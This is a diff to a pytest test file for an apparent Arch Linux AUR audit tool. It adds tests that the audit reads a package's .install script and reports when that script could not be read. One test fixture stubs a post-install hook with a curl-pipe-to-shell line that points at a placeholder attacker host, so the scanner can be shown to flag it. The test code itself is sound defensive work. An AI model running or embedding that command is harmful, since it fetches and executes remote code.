@@ -14,6 +14,7 @@ from unittest.mock import patch
 import pytest
 
 server = importlib.import_module("arch_ops_server.server")
+aur = importlib.import_module("arch_ops_server.aur")
 
 # Arguments for the prompts that require them; the rest take none.
 PROMPT_ARGUMENTS = {
@@ -36,8 +37,14 @@ def stubbed_network():
     async def wiki(*_args, **_kwargs):
         return []
 
+    async def no_install_file(*_args, **_kwargs):
+        raise ValueError("not found")
+
+    # get_aur_file is stubbed too: the audit prompt reads the .install script,
+    # so leaving it out would put these tests back on the network.
     with patch.object(server, "get_aur_info", new=aur_info), \
          patch.object(server, "get_pkgbuild", new=pkgbuild), \
+         patch.object(aur, "get_aur_file", new=no_install_file), \
          patch.object(server, "search_wiki", new=wiki):
         yield
 
@@ -103,7 +110,8 @@ class TestAuditPromptDoesNotCertify:
             )
 
         with patch.object(server, "get_aur_info", new=aur_info), \
-             patch.object(server, "get_pkgbuild", new=pkgbuild):
+             patch.object(server, "get_pkgbuild", new=pkgbuild), \
+             patch.object(aur, "get_aur_file", new=_missing_file):
             result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})
 
         text = result.messages[-1].content.text
@@ -125,7 +133,8 @@ class TestAuditPromptDoesNotCertify:
             return 'pkgname=demo\npkgver=1.0\nurl="https://example.com/demo"\n'
 
         with patch.object(server, "get_aur_info", new=aur_info), \
-             patch.object(server, "get_pkgbuild", new=pkgbuild):
+             patch.object(server, "get_pkgbuild", new=pkgbuild), \
+             patch.object(aur, "get_aur_file", new=_missing_file):
             result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})
 
         text = result.messages[-1].content.text
@@ -133,6 +142,65 @@ class TestAuditPromptDoesNotCertify:
         assert "**Critical patterns matched**: 0" in text
         assert "appears safe to install" not in text
         assert "not evidence that the package is safe" in text
+
+    @pytest.mark.asyncio
+    async def test_the_declared_install_script_is_scanned(self):
+        """
+        The prompt has the package name, so it can and must read the script.
+
+        install_package_secure reads it; if this path does not, the same
+        package audits clean here and dirty there, and the difference is
+        invisible to whoever is reading the report.
+        """
+        async def aur_info(_name):
+            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}
+
+        async def pkgbuild(_name):
+            return 'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n'
+
+        async def aur_file(_name, filename):
+            if filename == "post-install.sh":
+                return "post_install() {\n  curl https://evil.com/x.sh | sh\n}\n"
+            raise ValueError("not found")
+
+        with patch.object(server, "get_aur_info", new=aur_info), \
+             patch.object(server, "get_pkgbuild", new=pkgbuild), \
+             patch.object(aur, "get_aur_file", new=aur_file):
+            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})
+
+        text = result.messages[-1].content.text
+
+        # The red flag exists only in the install script.
+        assert "**Critical patterns matched**: 1" in text
+        # And the report says what it read, so the count can be accounted for.
+        assert "post-install.sh" in text
+        # The caveat must no longer claim the script went unread.
+        assert "Does not cover the .install script" not in text
+
+    @pytest.mark.asyncio
+    async def test_an_unreadable_install_script_is_reported(self):
+        """A declared script that could not be fetched is a gap, not a clean bill."""
+        async def aur_info(_name):
+            return {"data": {"Name": "demo", "NumVotes": 500, "Maintainer": "someone"}}
+
+        async def pkgbuild(_name):
+            return 'pkgname=demo\npkgver=1.0\ninstall=post-install.sh\n'
+
+        with patch.object(server, "get_aur_info", new=aur_info), \
+             patch.object(server, "get_pkgbuild", new=pkgbuild), \
+             patch.object(aur, "get_aur_file", new=_missing_file):
+            result = await server.get_prompt("audit_aur_package", {"package_name": "demo"})
+
+        text = result.messages[-1].content.text
+
+        assert "post-install.sh" in text
+        assert "NOT analysed" in text
+        assert "appears safe to install" not in text
+
+
+async def _missing_file(*_args, **_kwargs):
+    """Stand in for a package that has no such file, the way the AUR 404s."""
+    raise ValueError("not found")
 
 def _popular_package():
     """A package no honest audit could call orphaned or unpopular."""
